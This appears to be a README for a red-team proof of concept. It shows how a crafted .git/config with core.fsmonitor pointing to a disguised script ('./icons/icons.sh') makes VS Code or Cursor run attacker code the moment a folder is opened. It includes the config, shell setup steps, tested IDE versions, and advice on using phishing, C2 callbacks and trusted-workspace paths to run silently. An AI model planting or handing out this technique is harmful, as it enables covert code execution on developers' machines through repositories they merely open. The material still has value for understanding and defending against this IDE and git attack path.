***This is a documented (known) issue, but I found this during my research & its pretty useful for RT/PT.***

**Summary:** The FSMonitor helper is executed by `git` on every command like `git status`, `git diff`, etc., hence `git` will blindly launch whatever path we specfic there. Our IDEs runs `git status` automatically the moment you open a folder to populate its SCM (Source Control Management) panel; 

Which allows `git` to spawn the configured helper which executes attacker controlled code. This tradecraft can be used during RT or in a assume-breach scenario with any C2 or our [XRayC2](http://github.com/RootUp/XRayC2) to get a callback that evades traditional network defenses. (Ofcourse, phishing emails are required to trick end user, but opening a folder in IDE seems a fair operation).

Proof-of-work, `git clone` this repo add the below config under your `.git` directory. Once done open the crafted folder with IDE, a calculator should pop. (I have tested this with Code & Cursor). This POC is macOS specfic modify it according to your env.

```bash
bash-3.2$ cd git-fsmonitor
bash-3.2$ mkdir .git
bash-3.2$ nano .git/config
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
	ignorecase = true
	precomposeunicode = true
	fsmonitor = ./icons/icons.sh
bash-3.2$ chmod +x ./icons/icons.sh
bash-3.2$ git init
bash-3.2$ git config core.fsmonitor ./icons/icons.sh
bash-3.2$ ls git-fsmonitor-main/.git/
.DS_Store    config       description  HEAD         hooks/       info/        objects/     refs/        
bash-3.2$
```
**Tested on Code**

```
Version: 1.106.0 (Universal)
Commit: ac4cbdf48759c7d8c3eb91ffe6bb04316e263c57
Date: 2025-11-11T16:02:25.943Z
Electron: 37.7.0
ElectronBuildId: 12597478
Chromium: 138.0.7204.251
Node.js: 22.20.0
V8: 13.8.258.32-electron.0
OS: Darwin x64 25.1.0
```

https://github.com/user-attachments/assets/4702aadc-f12d-4380-bc6f-bcd564ddcf96 

This works because we initialize the repo & then add `core.fsmonitor` to a file (which can be a payload). Hence, opening a folder is enough to execute your code. "Most" devs/users have `~/Downloads` (and similar top-level folders) in their trusted workspace so the PoC runs silently; but if a repo lives outside those trusted paths so IDE will ask “trust this publisher?” prompt before reading `.git/config`.
